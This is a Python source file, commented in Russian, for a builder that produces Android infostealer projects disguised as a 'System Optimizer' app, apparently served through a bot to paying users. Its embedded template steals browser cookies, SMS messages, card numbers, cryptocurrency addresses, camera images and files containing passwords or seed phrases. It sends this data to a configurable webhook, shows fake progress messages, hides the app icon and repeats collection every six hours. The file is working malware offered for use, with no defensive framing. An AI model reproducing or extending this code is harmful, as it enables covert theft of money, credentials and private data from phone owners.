import os
import json
import shutil
import zipfile
import uuid
import hashlib
from datetime import datetime

class APKGenerator:
    def __init__(self):
        self.templates_dir = "templates"
        self.output_dir = "output"
        self.assets_dir = "assets"
        
        os.makedirs(self.output_dir, exist_ok=True)
    
    def generate_apk(self, config, user_id):
        """Генерация APK по конфигу"""
        try:
            # Создаем уникальный ID проекта
            project_id = f"stealer_{hashlib.md5((str(user_id) + str(datetime.now())).encode()).hexdigest()[:8]}"
            project_dir = os.path.join(self.output_dir, project_id)
            
            # Создаем структуру проекта
            self.create_project_structure(project_dir, config)
            
            # Генерируем файлы
            self.generate_main_py(project_dir, config)
            self.generate_buildozer_spec(project_dir, config)
            self.generate_requirements(project_dir)
            self.copy_assets(project_dir)
            
            # Создаем ZIP архив (симуляция APK)
            apk_path = self.create_apk_archive(project_dir, project_id)
            
            return {
                "success": True,
                "project_id": project_id,
                "apk_path": apk_path,
                "config": config,
                "download_url": f"/download/{project_id}"
            }
            
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def create_project_structure(self, project_dir, config):
        """Создание структуры проекта"""
        dirs = [
            project_dir,
            os.path.join(project_dir, "src"),
            os.path.join(project_dir, "assets"),
            os.path.join(project_dir, "libs")
        ]
        
        for dir_path in dirs:
            os.makedirs(dir_path, exist_ok=True)
    
    def generate_main_py(self, project_dir, config):
        """Генерация основного кода стиллера"""
        template = '''import kivy
kivy.require('2.1.0')
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.clock import Clock
import json
import os
import requests
import sqlite3
import subprocess
import uuid
import hashlib
import time
from datetime import datetime
from android.permissions import request_permissions, Permission
from android import android_api
import threading
import base64

# ===== КОНФИГУРАЦИЯ =====
CONFIG = {{config}}

WEBHOOK_URL = CONFIG['webhook_url']
STEALER_ID = CONFIG['stealer_id']
OWNER_ID = CONFIG['owner_id']

class DataCollector:
    def __init__(self):
        self.device_id = self.get_device_id()
    
    def get_device_id(self):
        try:
            return android_api.get('android_id', str(uuid.uuid4()))
        except:
            return str(uuid.uuid4())[:16]
    
    def get_system_info(self):
        info = {}
        try:
            info['model'] = android_api.get('device_model', 'Unknown')
            info['android'] = android_api.get('android_version', 'Unknown')
            info['manufacturer'] = android_api.get('manufacturer', 'Unknown')
            info['serial'] = android_api.get('serial', 'Unknown')
            info['rooted'] = self.check_root()
        except:
            pass
        return info
    
    def check_root(self):
        try:
            return os.path.exists('/system/bin/su') or os.path.exists('/system/xbin/su')
        except:
            return False
    
    def get_installed_apps(self):
        apps = []
        try:
            cmd = 'pm list packages -3'
            result = subprocess.check_output(cmd, shell=True).decode().split('\\n')
            apps = [pkg.replace('package:', '').strip() for pkg in result if pkg]
        except:
            pass
        return apps[:100]
    
    def collect_browser_data(self):
        browsers = ['com.android.chrome', 'com.sec.android.app.sbrowser']
        data = {}
        
        for browser in browsers:
            try:
                paths = [
                    f'/data/data/{{browser}}/databases',
                    f'/data/data/{{browser}}/app_chrome/Default'
                ]
                
                for path in paths:
                    if os.path.exists(path):
                        # Cookies
                        cookies_file = os.path.join(path, 'Cookies')
                        if os.path.exists(cookies_file):
                            conn = sqlite3.connect(cookies_file)
                            cursor = conn.cursor()
                            cursor.execute('SELECT host_key, name, value FROM cookies LIMIT 50')
                            cookies = cursor.fetchall()
                            conn.close()
                            
                            data[browser] = {'cookies': cookies}
            except:
                continue
        
        return data
    
    def find_cards(self):
        cards = []
        try:
            import re
            search_dirs = ['/sdcard/Download', '/sdcard/Documents']
            
            for directory in search_dirs:
                if os.path.exists(directory):
                    for root, dirs, files in os.walk(directory):
                        for file in files[:50]:
                            if file.endswith(('.txt', '.pdf', '.doc')):
                                filepath = os.path.join(root, file)
                                try:
                                    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                                        content = f.read()
                                        # Поиск номеров карт
                                        card_pattern = r'\\b(?:4[0-9]{{12}}(?:[0-9]{{3}})?|5[1-5][0-9]{{14}}|3[47][0-9]{{13}}|3(?:0[0-5]|[68][0-9])[0-9]{{11}}|6(?:011|5[0-9]{{2}})[0-9]{{12}}|(?:2131|1800|35\\\\d{{3}})\\\\d{{11}})\\b'
                                        found = re.findall(card_pattern, content)
                                        cards.extend(found[:10])
                                except:
                                    continue
        except:
            pass
        
        return list(set(cards))[:20]
    
    def find_crypto(self):
        wallets = []
        patterns = [
            '1[a-km-zA-HJ-NP-Z1-9]{{33}}',  # Bitcoin
            '0x[a-fA-F0-9]{{40}}',  # Ethereum
            'L[a-km-zA-HJ-NP-Z1-9]{{33}}',  # Litecoin
            'X[a-km-zA-HJ-NP-Z1-9]{{95}}',  # Monero
            'r[0-9a-zA-Z]{{24,34}}',  # Ripple
        ]
        
        try:
            import re
            search_dirs = ['/sdcard', '/sdcard/Download']
            
            for directory in search_dirs:
                if os.path.exists(directory):
                    for root, dirs, files in os.walk(directory):
                        for file in files[:100]:
                            if file.endswith(('.txt', '.json', '.doc')):
                                filepath = os.path.join(root, file)
                                try:
                                    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                                        content = f.read()
                                        for pattern in patterns:
                                            found = re.findall(pattern, content)
                                            wallets.extend(found)
                                except:
                                    continue
        except:
            pass
        
        return list(set(wallets))[:50]
    
    def collect_sms(self):
        messages = []
        try:
            cmd = 'content query --uri content://sms/inbox --projection address,body,date'
            result = subprocess.check_output(cmd, shell=True).decode('utf-8', errors='ignore')
            
            lines = result.split('Row:')
            for line in lines[1:51]:
                parts = line.split(',')
                if len(parts) >= 3:
                    msg = {{
                        'number': parts[0].split('=')[1].strip() if '=' in parts[0] else '',
                        'body': parts[1].split('=')[1].strip() if '=' in parts[1] else '',
                        'timestamp': parts[2].split('=')[1].strip() if '=' in parts[2] else ''
                    }}
                    messages.append(msg)
        except:
            pass
        
        return messages
    
    def capture_webcam(self):
        try:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            output_path = f'/sdcard/DCIM/Camera/capture_{{timestamp}}.jpg'
            
            cmd = f'am start -a android.media.action.IMAGE_CAPTURE --es output {{output_path}}'
            subprocess.run(cmd, shell=True, timeout=5)
            
            time.sleep(3)
            
            if os.path.exists(output_path):
                with open(output_path, 'rb') as f:
                    image_data = base64.b64encode(f.read()).decode('utf-8')
                
                os.remove(output_path)
                return {{'timestamp': timestamp, 'image': image_data[:50000]}}
        except:
            pass
        return None
    
    def find_files(self, extensions=['.txt', '.pdf', '.doc', '.docx', '.json']):
        important_files = []
        search_dirs = ['/sdcard/Download', '/sdcard/Documents', '/sdcard']
        
        for directory in search_dirs:
            if os.path.exists(directory):
                for root, dirs, files in os.walk(directory):
                    for file in files[:200]:
                        if any(file.endswith(ext) for ext in extensions):
                            filepath = os.path.join(root, file)
                            try:
                                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                                    content = f.read(10000)  # Читаем первые 10К символов
                                    # Проверяем на важные данные
                                    keywords = ['пароль', 'password', 'карта', 'card', 'wallet', 'кошелек', 'seed', 'private']
                                    if any(keyword in content.lower() for keyword in keywords):
                                        important_files.append({{
                                            'name': file,
                                            'path': filepath,
                                            'preview': content[:500]
                                        }})
                            except:
                                pass
        
        return important_files[:50]
    
    def collect_all(self):
        data = {{
            'stealer_id': STEALER_ID,
            'device_id': self.device_id,
            'timestamp': datetime.now().isoformat(),
            'owner_id': OWNER_ID
        }}
        
        # Сбор данных в потоках
        threads = []
        results = {{}}
        
        def collect_in_thread(func_name, func):
            try:
                results[func_name] = func()
            except:
                results[func_name] = None
        
        collectors = [
            ('system', self.get_system_info),
            ('apps', self.get_installed_apps),
            ('browsers', self.collect_browser_data),
            ('cards', self.find_cards),
            ('crypto', self.find_crypto),
            ('sms', self.collect_sms),
            ('webcam', self.capture_webcam),
            ('files', self.find_files)
        ]
        
        for name, func in collectors:
            if CONFIG.get(f'collect_{{name.replace("_", "")}}', True):
                thread = threading.Thread(target=collect_in_thread, args=(name, func))
                thread.start()
                threads.append(thread)
        
        # Ждем завершения
        for thread in threads:
            thread.join(timeout=30)
        
        # Добавляем результаты
        data.update(results)
        return data

class DataSender:
    @staticmethod
    def send(data):
        try:
            response = requests.post(
                WEBHOOK_URL,
                json=data,
                timeout=30,
                headers={{'Content-Type': 'application/json'}}
            )
            return response.status_code == 200
        except Exception as e:
            print(f"Send error: {{e}}")
            return False

class StealerApp(App):
    def build(self):
        # Запрашиваем разрешения
        permissions = [
            Permission.INTERNET,
            Permission.ACCESS_NETWORK_STATE,
            Permission.CAMERA,
            Permission.READ_SMS,
            Permission.SEND_SMS,
            Permission.READ_CONTACTS,
            Permission.READ_EXTERNAL_STORAGE,
            Permission.WRITE_EXTERNAL_STORAGE
        ]
        request_permissions(permissions)
        
        # Создаем интерфейс
        self.layout = BoxLayout(orientation='vertical', padding=20, spacing=10)
        
        self.title_label = Label(
            text="{{app_name}}\\n\\nИнициализация...",
            font_size='20sp',
            halign='center'
        )
        self.layout.add_widget(self.title_label)
        
        self.status_label = Label(
            text="Подготовка к работе...",
            font_size='16sp'
        )
        self.layout.add_widget(self.status_label)
        
        self.start_btn = Button(
            text="Запустить оптимизацию",
            size_hint=(1, 0.2),
            background_color=(0.2, 0.6, 1, 1)
        )
        self.start_btn.bind(on_press=self.start_collection)
        self.layout.add_widget(self.start_btn)
        
        # Автозапуск через 3 секунды
        Clock.schedule_once(self.auto_start, 3)
        
        return self.layout
    
    def auto_start(self, dt):
        if CONFIG.get('auto_start', True):
            self.start_collection(None)
    
    def start_collection(self, instance):
        if hasattr(self, 'collection_started') and self.collection_started:
            return
        
        self.collection_started = True
        self.start_btn.disabled = True
        self.start_btn.text = "Выполняется оптимизация..."
        
        # Поэтапный сбор
        Clock.schedule_once(self.step1, 1)
        Clock.schedule_once(self.step2, 3)
        Clock.schedule_once(self.step3, 6)
        Clock.schedule_once(self.step4, 10)
    
    def step1(self, dt):
        self.status_label.text = "Сбор системной информации..."
        self.collector = DataCollector()
    
    def step2(self, dt):
        self.status_label.text = "Анализ установленных приложений..."
    
    def step3(self, dt):
        self.status_label.text = "Поиск важных данных..."
    
    def step4(self, dt):
        self.status_label.text = "Отправка данных на сервер..."
        
        # Сбор всех данных
        data = self.collector.collect_all()
        
        # Отправка
        if DataSender.send(data):
            self.status_label.text = "✅ Оптимизация завершена!\\n\\nСистема готова к работе."
            self.start_btn.text = "Оптимизация выполнена"
            self.start_btn.background_color = (0, 0.8, 0, 1)
        else:
            self.status_label.text = "⚠️ Оптимизация завершена\\nОффлайн режим активирован"
        
        # Скрытие иконки если нужно
        if CONFIG.get('hide_icon', True):
            self.hide_app_icon()
    
    def hide_app_icon(self):
        try:
            from jnius import autoclass
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            PackageManager = autoclass('android.content.pm.PackageManager')
            ComponentName = autoclass('android.content.ComponentName')
            
            pm = PythonActivity.mActivity.getPackageManager()
            component = ComponentName(PythonActivity.mActivity, PythonActivity.mActivity.getClass())
            pm.setComponentEnabledSetting(
                component,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        except:
            pass

def main():
    app = StealerApp()
    
    # Фоновый сбор каждые 6 часов
    if CONFIG.get('persistence', True):
        def background_collection():
            while True:
                try:
                    time.sleep(21600)  # 6 часов
                    collector = DataCollector()
                    data = collector.collect_all()
                    DataSender.send(data)
                except:
                    pass
        
        thread = threading.Thread(target=background_collection, daemon=True)
        thread.start()
    
    app.run()

if __name__ == '__main__':
    main()
'''
        
        # Заменяем плейсхолдеры
        code = template.replace("{{config}}", json.dumps(config, indent=4, ensure_ascii=False))
        code = code.replace("{{app_name}}", config.get('name', 'System Optimizer'))
        
        # Сохраняем файл
        main_py_path = os.path.join(project_dir, "src", "main.py")
        with open(main_py_path, 'w', encoding='utf-8') as f:
            f.write(code)
    
    def generate_buildozer_spec(self, project_dir, config):
        """Генерация buildozer.spec"""
        spec = f"""[app]
title = {config.get('name', 'System Optimizer')}
package.name = {config.get('name', 'optimizer').lower().replace(' ', '')}
package.domain = com.{config.get('name', 'optimizer').lower().replace(' ', '')[:8]}
source.dir = src
source.include_exts = py,png,jpg,kv,atlas,ttf,json
version = 1.0
requirements = python3,kivy==2.1.0,requests,pyjnius,android
orientation = portrait
fullscreen = 0
log_level = 2

[buildozer]
log_level = 2

[android]
arch = arm64-v8a,armeabi-v7a
permissions = INTERNET,ACCESS_NETWORK_STATE,ACCESS_WIFI_STATE,CAMERA,READ_SMS,SEND_SMS,READ_CONTACTS,ACCESS_FINE_LOCATION,ACCESS_COARSE_LOCATION,READ_EXTERNAL_STORAGE,WRITE_EXTERNAL_STORAGE,RECEIVE_BOOT_COMPLETED
android.accept_sdk_license = True
android.api = 31
android.minapi = 21
android.sdk = 24
android.ndk = 23b
android.ndk_api = 21

[android:meta-data]
android.app.component = service

[android:service]
name = StealerService
entrypoint = stealer.service:main
"""
        
        spec_path = os.path.join(project_dir, "buildozer.spec")
        with open(spec_path, 'w', encoding='utf-8') as f:
            f.write(spec)
    
    def generate_requirements(self, project_dir):
        """Генерация requirements.txt для APK"""
        requirements = """kivy==2.1.0
requests==2.31.0
pyjnius==1.5.0
android==0.1
"""
        
        req_path = os.path.join(project_dir, "requirements.txt")
        with open(req_path, 'w') as f:
            f.write(requirements)
    
    def copy_assets(self, project_dir):
        """Копирование ресурсов"""
        # Копируем иконку если есть
        icon_src = os.path.join(self.assets_dir, "icon.png")
        icon_dst = os.path.join(project_dir, "assets", "icon.png")
        
        if os.path.exists(icon_src):
            shutil.copy(icon_src, icon_dst)
        else:
            # Создаем простую иконку
            self.create_default_icon(icon_dst)
    
    def create_default_icon(self, path):
        """Создание дефолтной иконки (заглушка)"""
        from PIL import Image, ImageDraw
        img = Image.new('RGB', (512, 512), color='blue')
        d = ImageDraw.Draw(img)
        d.text((256, 256), "APP", fill='white')
        img.save(path)
    
    def create_apk_archive(self, project_dir, project_id):
        """Создание ZIP архива с проектом"""
        zip_path = os.path.join(self.output_dir, f"{project_id}.zip")
        
        with zipfile.ZipFile(zip_path, 'w') as zipf:
            for root, dirs, files in os.walk(project_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, project_dir)
                    zipf.write(file_path, arcname)
        
        return zip_path

# Интеграция с основным ботом
def generate_apk_for_user(config, user_id):
    generator = APKGenerator()
    return generator.generate_apk(config, user_id)
